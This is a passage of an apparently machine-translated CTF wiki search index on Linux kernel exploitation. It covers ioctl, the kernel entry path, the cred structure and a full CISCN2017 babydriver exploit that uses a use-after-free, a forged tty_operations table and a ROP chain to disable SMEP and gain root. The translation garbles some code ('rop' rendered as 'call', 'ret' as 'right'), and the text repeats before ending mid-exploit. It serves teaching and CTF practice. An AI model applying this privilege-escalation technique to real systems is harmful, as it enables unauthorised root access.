features.","title":"syscall"},{"location":"pwn/linux/kernel/basic_knowledge/#ioctl","text":"Directly view the man page NAME ioctl - control device SYNOPSIS #include <sys/ioctl.h> int ioctl(int fd, unsigned long request, ...); DESCRIPTION The ioctl() system call manipulates the underlying device parameters of special files. In particular, many operating characteristics of character special files (e.g., terminals) may be controlled with ioctl() requests. The argument fd must be an open file descriptor. The second argument is a device-dependent request code. The third argument is an untyped pointer to memory. It's traditionally char *argp (from the days before void * was valid C), and will be so named for this discussion. An ioctl() request has encoded in it whether the argument is an in parameter or out parameter, and the size of the argument argp in bytes. Macros and defines used in specifying an ioctl() request are located in the file <sys/ioctl.h>. It can be seen that ioctl is also a system call for communicating with devices. The first argument to int ioctl(int fd, unsigned long request, ...) is the [file descriptor] returned by the open device (open) ( http://m4x.fun/post/play-with-file -descriptor-1/), the second parameter is the user program's control command for the device, and the latter parameter is some supplementary parameter, which is related to the device. > Reasons for communicating with ioctl: > The operating system provides kernel access to system calls to standard external devices, as most hardware devices can only be addressed directly within kernel space, but when accessing non-standard hardware devices these system calls are not appropriate, and sometimes user mode may need to be directly Access the device. > For example, a system administrator might want to modify the configuration of the NIC. Modern operating systems provide support for a wide variety of devices, and some devices may not be considered by the kernel designer, thus making it impossible to provide such a system call to use the device. > To solve this problem, the kernel is designed to be extensible, and a module called device driver can be added. The driver code allows it to run in kernel space and directly address the device. An Ioctl interface is a separate system call through which user space can communicate with device drivers. The device-driven request is an Ioctl call with the device and request number as parameters, so the kernel allows user space to access the device driver and access the device without knowing the specific device details, and does not require a lot of different devices. System call.","title":"ioctl"},{"location":"pwn/linux/kernel/basic_knowledge/#status-switch","text":"","title":"Status Switch"},{"location":"pwn/linux/kernel/basic_knowledge/#user-space-to-kernel-space","text":"When a 'system call', generate exception , peripheral generate interrupt , etc. event occurs, the user mode to kernel mode switch occurs. The specific process is: Switch the GS segment register with swapgs to exchange the GS register value with the value of a specific location. The purpose is to save the GS value and use the value of this location as the GS value when the kernel is executed. Record the current top of the stack (the top of the user space stack) in the CPU exclusive variable area, and put the top of the kernel stack recorded in the CPU exclusive area into rsp/esp. Save each register value by push. The specific [code] ( http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S ) is as follows: ` asm \u200b ENTRY(entry_SYSCALL_64) / SWAPGS_UNSAFE_STACK is a macro, x86 is directly defined as the swapgs command / \u200b SWAPGS_UNSAFE_STACK \u200b / Save the stack value and set the kernel stack / \u200b movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp \u200b \u200b / Save the register value by push to form a pt_regs structure / \u200b / Construct struct pt_regs on stack / pushq $__USER_DS /* pt_regs->ss */ pushq PER_CPU_VAR(rsp_scratch) /* pt_regs->sp */ pushq %r11 /* pt_regs->flags */ pushq $__USER_CS /* pt_regs->cs */ pushq %rcx /* pt_regs->ip */ pushq %rax /* pt_regs->orig_ax */ pushq% rdi / * pt_regs-> at * / pushq% rsi / * pt_regs-> and * / \u200b pushq %rdx / pt_regs->dx / Pushq %rcx tuichu / pt_regs->cx / \u200b pushq $-ENOSYS / pt_regs->ax / pushq %r8 /* pt_regs->r8 */ pushq% r9 / * pt_regs-> r9 * / \u200b pushq %r10 / pt_regs->r10 / pushq %r11 /* pt_regs->r11 */ sub $(6*8), %rsp /* pt_regs->bp, bx, r12-15 not saved */ ``` Determine if it is x32_abi by the assembly instruction. Continue to execute the system call by jumping to the corresponding location of the global variable sys_call_table by the system call number.","title":"user space to kernel space"},{"location":"pwn/linux/kernel/basic_knowledge/#kernel-space-to-user-space","text":"When exiting, the process is as follows: Restore GS value by swapgs Resume to the user control via sysretq or iretq to continue execution. If you use iretq you also need to give some information about the user space (CS, eflags/rflags, esp/rsp, etc.)","title":"kernel space to user space"},{"location":"pwn/linux/kernel/basic_knowledge/#structure-i-think","text":"As mentioned before, the kernel records the permissions of the process. More specifically, it is recorded by the cred structure. Each process has a cred structure. This structure saves the permissions of the process (uid, gid, etc.). Can modify the cred of a process, then modify the permissions of this process. [source code] ( https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred ) as follows: ` asm struct cred { \u200b atomic_t usage;","title":"structure I think"},{"location":"pwn/linux/kernel/basic_knowledge/#ifdef-config_debug_credentials","text":"atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;","title":"ifdef CONFIG_DEBUG_CREDENTIALS"},{"location":"pwn/linux/kernel/basic_knowledge/#define-cred_magic-0x43736564","text":"","title":"define CRED_MAGIC  0x43736564"},{"location":"pwn/linux/kernel/basic_knowledge/#define-cred_magic_dead-0x44656144","text":"","title":"define CRED_MAGIC_DEAD 0x44656144"},{"location":"pwn/linux/kernel/basic_knowledge/#endif","text":"\u200b kuid_t uid; / real UID of the task / kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ but_t fsuid; / * UID for VFS ops * / \u200b kgid_t fsgid; / GID for VFS ops / unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */","title":"endif"},{"location":"pwn/linux/kernel/basic_knowledge/#ifdef-config_keys","text":"unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */","title":"ifdef CONFIG_KEYS"},{"location":"pwn/linux/kernel/basic_knowledge/#endif_1","text":"","title":"endif"},{"location":"pwn/linux/kernel/basic_knowledge/#ifdef-config_security","text":"void *security; /* subjective LSM security */","title":"ifdef CONFIG_SECURITY"},{"location":"pwn/linux/kernel/basic_knowledge/#endif_2","text":"\u200b struct user_struct user; / real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */ } __randomize_layout; ## Kernel state function Kernel state functions have some changes compared to user state library functions - printf() -&gt; **printk()**, but note that printk() does not necessarily display the content on the terminal, but it must be in the kernel buffer. You can view the effect via `dmesg` - memcpy() -> **copy\\_from\\_user()/copy\\_to\\_user()** - copy\\_from\\_user() implements transferring user space data to kernel space - copy\\_to\\_user() implements transferring kernel space data to user space - malloc() -&gt; **kmalloc()**, kernel-mode memory allocation function, similar to malloc(), but using the `slab/slub allocator` - free() -> **kfree()**\uff0c\u540c kmalloc() Also note that the `kernel manages the process, so the kernel also records the permissions of the process`. There are two functions in the kernel that can easily change permissions: - **int commit_creds(struct cred \\*new)** - **struct cred\\* prepare_kernel_cred(struct task_struct\\* daemon)** As you can see from the function name, execute `commit_creds(prepare_kernel_cred(0))` to get root privileges (root&#39;s uid, gid is 0) Executing `commit_creds(prepare_kernel_cred(0))` is also the most commonly used method of lifting. The addresses of both functions can be viewed in `/proc/kallsyms` (the older kernel version is `/proc/ksyms`. \u200b```bash post sudo grep commit_creds /proc/kallsyms [sudo] m4x password: ffffffffbb6af9e0 T commit_creds ffffffffbc7cb3d0 r __ksymtab_commit_creds ffffffffbc7f06fe r __kstrtab_commit_creds post sudo grep prepare_kernel_cred /proc/kallsyms ffffffffbb6afd90 T prepare_kernel_cred ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred > In general, the contents of /proc/kallsyms require root privileges to view","title":"endif"},{"location":"pwn/linux/kernel/basic_knowledge/#mitigation","text":"> canary, dep, PIE, RELRO and other protections are the same as user principles smep: Supervisor Mode Execution Protection, when the processor is in ring0 mode, executing the userspace code will trigger a page fault. (This protection is called PXN in arm) smap: Superivisor Mode Access Protection, similar to smep, usually when accessing data. mmap_min_addr:","title":"Mitigation"},{"location":"pwn/linux/kernel/basic_knowledge/#ctf-kernel-pwn-related","text":"Generally given the following three documents boot.sh: a script for starting the shell of the kernel, mostly using qemu, the protection measures are related to the different startup parameters of qemu bzImage: kernel binary rootfs.cpio: file system image such as: \u200b ```bash CISCN2017_babydriver [master]] ls babydriver.tar CISCN2017_babydriver [master \u25cf] x baby driver.tar \u200b boot.sh bzImage rootfs.cpio CISCN2017_babydriver [master]] ls \u200b babydriver.tar boot.sh bzImage rootfs.cpio CISCN2017_babydriver [master\u25cf] file bzImage bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA CISCN2017_babydriver [master\u25cf] file rootfs.cpio rootfs.cpio: gzip compressed data, last modified: Tue Jul 4 08:39:15 2017, max compression, from Unix, original size 2844672 CISCN2017_babydriver [master\u25cf] file boot.sh boot.sh: Bourne-Again shell script, ASCII text executable CISCN2017_babydriver [master \u25cf] bat boot.sh \u200b \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: boot.sh \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 #!/bin/bash 2 \u2502 3 \u2502 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 ro \u2502 ot=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographi \u2502 c -smp cores=1,threads=1 -cpu kvm64,+smep \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ``` Explain the parameters that qemu starts: \u200b -initrd rootfs.cpio, using rootfs.cpio as the kernel-initiated file system -kernel bzImage, using bzImage as the kernel image -cpu kvm64, +smep, set the security options for the CPU, here smep is enabled -m 64M, set the virtual RAM to 64M, the default is 128M Other options can be viewed with --help. After writing the exploit locally, you can save the compiled binary file to the remote directory by base64 encoding, etc., and then get the flag.","title":"CTF kernel pwn Related"},{"location":"pwn/linux/kernel/basic_knowledge/#reference","text":"Https://en.wikipedia.org/wiki/kernel https://en.wikipedia.org/wiki/Classified protection domain https://zh.wikipedia.org/wiki/Ioctl http://www.freebuf.com/articles/system/54263.html https://blog.csdn.net/zqixiao_09/article/details/50839042 https://yq.aliyun.com/articles/53679","title":"Reference:"},{"location":"pwn/linux/kernel/bypass_smep/","text":"bypass-smep \u00b6 SMEP \u00b6 In order to prevent the ret2usr attack, the kernel developer proposed smep protection, smep full name Supervisor Mode Execution Protection , which is a protection measure of the kernel. When the CPU is in ring0 mode, it performs user space&#39;. Code will trigger a page fault; this protection is called PXN in arm. The option when starting the kernel with qemu can determine whether smep protection is enabled. CISCN2017_babydriver [ master \u25cf\u25cf ] grab smep ./boot.sh qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores = 1 ,threads = 1 -cpu kvm64,+smep Can also pass CISCN2017_babydriver [ master \u25cf\u25cf ] grep smep / proc / cpuinfo flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts ...... Check if the protection is turned on. smep and CR4 registers \u00b6 The system judges whether to enable smep protection according to the value of the CR4 register. When the 20 th bit of the CR4 register is 1, the protection is turned on; when it is 0, the protection is turned off. For example, when $ CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000 When smep protection is turned on. The CR4 register can be modified by the mov instruction, so only the need is needed. ` asm mov cr4, 0x1407e0 0x1407e0 = 101 0 0000 0011 1111 00000 \u00b6 You can turn off smep protection. Searching for the gadget extracted from `vmlinux` is easy to achieve. - How do I check the value of the CR4 register? - gdb cannot view the value of the cr4 register and can be viewed by the information when the kernel crashes. In order to turn off smep protection, a fixed value of `0x6f0`, ie `mov cr4, 0x6f0`, is commonly used. ### CISCN2017 - baby driver I have previously analyzed the use of [uaf to change cred] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/#ciscn2017-babydriver), this time, another way, Elevate by closing smep protection and ret2usr. The method chosen here is to first control a `tty_struct` structure through uaf, and assign such a structure when `open(&quot;/dev/ptmx&quot;, O_RDWR)` The [source] of `tty_struct` (https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct) is as follows: \u200b```C struct tty_struct { int magic; struct kref kref; struct device *dev; struct tty_driver *driver; const struct tty_operations *ops; int index; /* Protects ldisc changes: Lock tty not pty */ struct ld_semaphore ldisc_sem; struct tty_ldisc *ldisc; struct mutex atomic_write_lock; struct mutex legacy_mutex; struct mutex throttle_mutex; struct rw_semaphore termios_rwsem; struct mutex winsize_mutex; spinlock_t ctrl_lock; spinlock_t flow_lock; /* Termios values are protected by the termios rwsem */ struct ktermios termios, termios_locked; struct termiox *termiox; /* May be NULL for unsupported */ char name[64]; struct pid *pgrp; /* Protected by ctrl lock */ struct pid *session; unsigned long flags; int count; struct winsize winsize; /* winsize_mutex */ unsigned long stopped:1, /* flow_lock */ flow_stopped:1, unused:BITS_PER_LONG - 2; int hw_stopped; unsigned long ctrl_status:8, /* ctrl_lock */ packet:1, unused_ctrl:BITS_PER_LONG - 9; unsigned int receive_room; /* Bytes free for queue */ int flow_change; struct tty_struct *link; struct fasync_struct *fasync; wait_queue_head_t write_wait; wait_queue_head_t read_wait; struct work_struct hangup_work; void *disc_data; void *driver_data; spinlock_t files_lock; /* protects tty_files list */ struct list_head tty_files; #define N_TTY_BUF_SIZE 4096 int closing; unsigned char *write_buf; int write_cnt; /* If the tty has a pending do_SAK, queue it here - akpm */ struct work_struct SAK_work; struct tty_port *port; } __randomize_layout; Why should we control this structure? Because there is another interesting structure tty_operations , [source] ( https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations ) is as follows: struct tty_operations { struct tty_struct * ( * lookup )( struct tty_driver * driver , struct file * filp , int idx ); int ( * install )( struct tty_driver * driver , struct tty_struct * tty ); void ( * remove )( struct tty_driver * driver , struct tty_struct * tty ); int ( * open )( struct tty_struct * tty , struct file * filp ); void ( * close )( struct tty_struct * tty , struct file * filp ); void ( * shutdown )( struct tty_struct * tty ); void ( * cleanup )( struct tty_struct * tty ); int ( * write )( struct tty_struct * tty , const unsigned char * buf , int count ); int ( * put_char )( struct tty_struct * tty , unsigned char ch ); void ( * flush_chars )( struct tty_struct * tty ); int ( * write_room )( struct tty_struct * tty ); int ( * chars_in_buffer )( struct tty_struct * tty ); int ( * ioctl )( struct tty_struct * tty , unsigned int cmd , unsigned long arg ); long ( * compat_ioctl )( struct tty_struct * tty , unsigned int cmd , unsigned long arg ); void ( * set_termios )( struct tty_struct * tty , struct ktermios * old ); void ( * throttle )( struct tty_struct * tty ); void ( * unthrottle )( struct tty_struct * tty ); void ( * stop )( struct tty_struct * tty ); void ( * start )( struct tty_struct * tty ); void ( * hangup )( struct tty_struct * tty ); int ( * break_ctl )( struct tty_struct * tty , int state ); void ( * flush_buffer )( struct tty_struct * tty ); void ( * set_ldisc )( struct tty_struct * tty ); void ( * wait_until_sent )( struct tty_struct * tty , int timeout ); void ( * send_xchar )( struct tty_struct * tty , char ch ); int ( * tiocmget )( struct tty_struct * tty ); int ( * tiocmset )( struct tty_struct * tty , unsigned int set , unsigned int clear ); int ( * resize )( struct tty_struct * tty , struct winsize * ws ); int ( * set_termiox )( struct tty_struct * tty , struct termiox * tnew ); int ( * get_icount )( struct tty_struct * tty , struct serial_icounter_struct * icount ); void ( * show_fdinfo )( struct tty_struct * tty , struct seq_file * m ); #ifdef CONFIG_CONSOLE_POLL int ( * poll_init )( struct tty_driver * driver , int line , char * options ); int ( * poll_get_char )( struct tty_driver * driver , int line ); void ( * poll_put_char )( struct tty_driver * driver , int line , char ch ); #endif int ( * proc_show )( struct seq_file * , void * ); } __randomize_layout ; A lot of function pointers (pwn hand feng shui treasure), so I imagine constructing the structure shown in the figure below fake_tty_struct fake_tty_operations +---------+ +----------+ |magic | +-->|evil 1 | +---------+ | +----------+ |...... | | |evil 2 | |...... | | +----------+ +---------+ | |evil 3 | |*ops |--+ +----------+ +---------+ |evil 4 | |...... | +----------+ |...... | |...... | +---------+ +----------+ Then we can jump to different evils through different operations (such as write, ioctl , etc.). For this topic, because smep protection is enabled, if you want ret2usr to increase the weight, you need to modify the value of cr4, and the control function pointer is not enough. You can control the function pointer to perform the stack pivot and other operations to our rop chain. Space, close smep with rop, and then proceed. > This question is not given to vmlinux. You need to extract the kernel image using [extract-vmlinux] ( https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux ). After turning off smep protection, you can use rop to do whatever you want. The final exp is as follows: #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #define prepare_kernel_cred_addr 0xffffffff810a1810 #define commit_creds_addr 0xffffffff810a1420 void * fake_tty_operations [ 30 ]; size_t user_cs , user_ss , user_rflags , user_sp ; void save_status () { __asm__ ( \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" & quot ; pushf ; & quot ; \"pop user_rflags;\" ); puts ( \"[*]status has been saved.\" ); } void get_shell () { system ( \"/bin/sh\" ); } void get_root () { char * ( * pkc )( int ) = prepare_kernel_cred_addr ; void ( * cc )( char * ) = commit_creds_addr ; ( * cc ) (( * pkc ) ( 0 )); } int main () { save_status (); int i = 0 ; size_t rop [ 32 ] = { 0 }; call [ i ++ ] = 0xffffffff810d238d ; // pop rdi; right; call [ i ++ ] = 0x6f0 ; call [ i ++ ] = 0xffffffff81004d80 ; // mov cr4, rdi; pop rbp; right; call [ i ++ ] = 0 ; rop [ i ++ ] = ( size_t ) get_root ; call [ i ++ ] = 0xffffffff81063694 ; // swapgs; pop rbp; right; call [ i ++ ] = 0 ; call [ i ++ ] = 0xffffffff814e35ef ; // iretq; right; rop [ i ++ ] = ( size_t ) get_shell ; rop [ i ++ ] = user_cs ; /* saved CS */ rop [ i ++ ] = user_rflags ; /* saved EFLAGS */ rop [ i ++ ] = user_sp ; rop [ i ++ ] = user_ss ; for ( int i = 0 ; i < 30 ; i ++ ) { fake_tty_operations [ i ] = 0xFFFFFFFF8181BFC5 ; } fake_tty_operations [ 0 ] = 0xffffffff810635f5 ; //pop rax; pop rbp; ret; fake_tty_operations [ 1 ] = ( size_t ) rop ; fake_tty_operations [ 3 ] = 0xFFFFFFFF8181BFC5 ; // mov rsp,rax ; dec ebx ; ret int fd1 = open ( \"/dev/babydev\" , O_RDWR ); int fd2 = open ( \"/dev/babydev\" , O_RDWR ); ioctl ( fd1 , 0x10001 , 0x2e0 ); close ( fd1 ); int fd_tty = open ( \"/dev/ptmx\" , O_RDWR | O_NOCTTY ); size_t fake_tty_struct [ 4 ] = { 0 }; read ( fd2 , fake_tty_struct , 32 ); fake_tty_struct [ 3 ] = ( size_t ) fake_tty_operations ; write ( fd2 , fake_tty_struct , 32 ); char buf [ 0x8 ] = { 0 }; write ( fd_tty , buf , 8 ); return 0 ; }","title":"bypass-smep"},{"location":"pwn/linux/kernel/bypass_smep/#bypass-smep","text":"","title":"bypass-smep"},{"location":"pwn/linux/kernel/bypass_smep/#smep","text":"In order to prevent the ret2usr attack, the kernel developer proposed smep protection, smep full name Supervisor Mode Execution Protection , which is a protection measure of the kernel. When the CPU is in ring0 mode, it performs user space&#39;. Code will trigger a page fault; this protection is called PXN in arm. The option when starting the kernel with qemu can determine whether smep protection is enabled. CISCN2017_babydriver [ master \u25cf\u25cf ] grab smep ./boot.sh qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores = 1 ,threads = 1 -cpu kvm64,+smep Can also pass CISCN2017_babydriver [ master \u25cf\u25cf ] grep smep / proc / cpuinfo flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts ...... Check if the protection is turned on.","title":"SMEP"},{"location":"pwn/linux/kernel/bypass_smep/#smep-and-cr4-registers","text":"The system judges whether to enable smep protection according to the value of the CR4 register. When the 20 th bit of the CR4 register is 1, the protection is turned on; when it is 0, the protection is turned off. For example, when $ CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000 When smep protection is turned on. The CR4 register can be modified by the mov instruction, so only the need is needed. ` asm mov cr4, 0x1407e0","title":"smep and CR4 registers"},{"location":"pwn/linux/kernel/bypass_smep/#0x1407e0-101-0-0000-0011-1111-00000","text":"You can turn off smep protection. Searching for the gadget extracted from `vmlinux` is easy to achieve. - How do I check the value of the CR4 register? - gdb cannot view the value of the cr4 register and can be viewed by the information when the kernel crashes. In order to turn off smep protection, a fixed value of `0x6f0`, ie `mov cr4, 0x6f0`, is commonly used. ### CISCN2017 - baby driver I have previously analyzed the use of [uaf to change cred] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/#ciscn2017-babydriver), this time, another way, Elevate by closing smep protection and ret2usr. The method chosen here is to first control a `tty_struct` structure through uaf, and assign such a structure when `open(&quot;/dev/ptmx&quot;, O_RDWR)` The [source] of `tty_struct` (https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct) is as follows: \u200b```C struct tty_struct { int magic; struct kref kref; struct device *dev; struct tty_driver *driver; const struct tty_operations *ops; int index; /* Protects ldisc changes: Lock tty not pty */ struct ld_semaphore ldisc_sem; struct tty_ldisc *ldisc; struct mutex atomic_write_lock; struct mutex legacy_mutex; struct mutex throttle_mutex; struct rw_semaphore termios_rwsem; struct mutex winsize_mutex; spinlock_t ctrl_lock; spinlock_t flow_lock; /* Termios values are protected by the termios rwsem */ struct ktermios termios, termios_locked; struct termiox *termiox; /* May be NULL for unsupported */ char name[64]; struct pid *pgrp; /* Protected by ctrl lock */ struct pid *session; unsigned long flags; int count; struct winsize winsize; /* winsize_mutex */ unsigned long stopped:1, /* flow_lock */ flow_stopped:1, unused:BITS_PER_LONG - 2; int hw_stopped; unsigned long ctrl_status:8, /* ctrl_lock */ packet:1, unused_ctrl:BITS_PER_LONG - 9; unsigned int receive_room; /* Bytes free for queue */ int flow_change; struct tty_struct *link; struct fasync_struct *fasync; wait_queue_head_t write_wait; wait_queue_head_t read_wait; struct work_struct hangup_work; void *disc_data; void *driver_data; spinlock_t files_lock; /* protects tty_files list */ struct list_head tty_files; #define N_TTY_BUF_SIZE 4096 int closing; unsigned char *write_buf; int write_cnt; /* If the tty has a pending do_SAK, queue it here - akpm */ struct work_struct SAK_work; struct tty_port *port; } __randomize_layout; Why should we control this structure? Because there is another interesting structure tty_operations , [source] ( https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations ) is as follows: struct tty_operations { struct tty_struct * ( * lookup )( struct tty_driver * driver , struct file * filp , int idx ); int ( * install )( struct tty_driver * driver , struct tty_struct * tty ); void ( * remove )( struct tty_driver * driver , struct tty_struct * tty ); int ( * open )( struct tty_struct * tty , struct file * filp ); void ( * close )( struct tty_struct * tty , struct file * filp ); void ( * shutdown )( struct tty_struct * tty ); void ( * cleanup )( struct tty_struct * tty ); int ( * write )( struct tty_struct * tty , const unsigned char * buf , int count ); int ( * put_char )( struct tty_struct * tty , unsigned char ch ); void ( * flush_chars )( struct tty_struct * tty ); int ( * write_room )( struct tty_struct * tty ); int ( * chars_in_buffer )( struct tty_struct * tty ); int ( * ioctl )( struct tty_struct * tty , unsigned int cmd , unsigned long arg ); long ( * compat_ioctl )( struct tty_struct * tty , unsigned int cmd , unsigned long arg ); void ( * set_termios )( struct tty_struct * tty , struct ktermios * old ); void ( * throttle )( struct tty_struct * tty ); void ( * unthrottle )( struct tty_struct * tty ); void ( * stop )( struct tty_struct * tty ); void ( * start )( struct tty_struct * tty ); void ( * hangup )( struct tty_struct * tty ); int ( * break_ctl )( struct tty_struct * tty , int state ); void ( * flush_buffer )( struct tty_struct * tty ); void ( * set_ldisc )( struct tty_struct * tty ); void ( * wait_until_sent )( struct tty_struct * tty , int timeout ); void ( * send_xchar )( struct tty_struct * tty , char ch ); int ( * tiocmget )( struct tty_struct * tty ); int ( * tiocmset )( struct tty_struct * tty , unsigned int set , unsigned int clear ); int ( * resize )( struct tty_struct * tty , struct winsize * ws ); int ( * set_termiox )( struct tty_struct * tty , struct termiox * tnew ); int ( * get_icount )( struct tty_struct * tty , struct serial_icounter_struct * icount ); void ( * show_fdinfo )( struct tty_struct * tty , struct seq_file * m ); #ifdef CONFIG_CONSOLE_POLL int ( * poll_init )( struct tty_driver * driver , int line , char * options ); int ( * poll_get_char )( struct tty_driver * driver , int line ); void ( * poll_put_char )( struct tty_driver * driver , int line , char ch ); #endif int ( * proc_show )( struct seq_file * , void * ); } __randomize_layout ; A lot of function pointers (pwn hand feng shui treasure), so I imagine constructing the structure shown in the figure below fake_tty_struct fake_tty_operations +---------+ +----------+ |magic | +-->|evil 1 | +---------+ | +----------+ |...... | | |evil 2 | |...... | | +----------+ +---------+ | |evil 3 | |*ops |--+ +----------+ +---------+ |evil 4 | |...... | +----------+ |...... | |...... | +---------+ +----------+ Then we can jump to different evils through different operations (such as write, ioctl , etc.). For this topic, because smep protection is enabled, if you want ret2usr to increase the weight, you need to modify the value of cr4, and the control function pointer is not enough. You can control the function pointer to perform the stack pivot and other operations to our rop chain. Space, close smep with rop, and then proceed. > This question is not given to vmlinux. You need to extract the kernel image using [extract-vmlinux] ( https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux ). After turning off smep protection, you can use rop to do whatever you want. The final exp is as follows: #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #define prepare_kernel_cred_addr 0xffffffff810a1810 #define commit_creds_addr 0xffffffff810a1420 void * fake_tty_operations [ 30 ]; size_t user_cs , user_ss , user_rflags , user_sp ; void save_status () { __asm__ ( \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" & quot ; pushf ; & quot ; \"pop user_rflags;\" ); puts ( \"[*]status has been saved.\" ); } void get_shell () { system ( \"/bin/sh\" ); } void get_root () { char * ( * pkc )( int ) = prepare_kernel_cred_addr ; void ( * cc )( char * ) = commit_creds_addr ; ( * cc ) (( * pkc ) ( 0 )); } int main () { save_status (); int i = 0 ; size_t rop [ 32 ] = { 0 }; call [ i ++ ] = 0xffffffff810d238d ; // pop rdi; right; call [ i ++ ] = 0x6f0 ; call [ i ++ ] = 0xffffffff81004d80 ; // mov cr4, rdi; pop rbp; right; call [ i ++ ] = 0 ; rop [ i ++ ] = 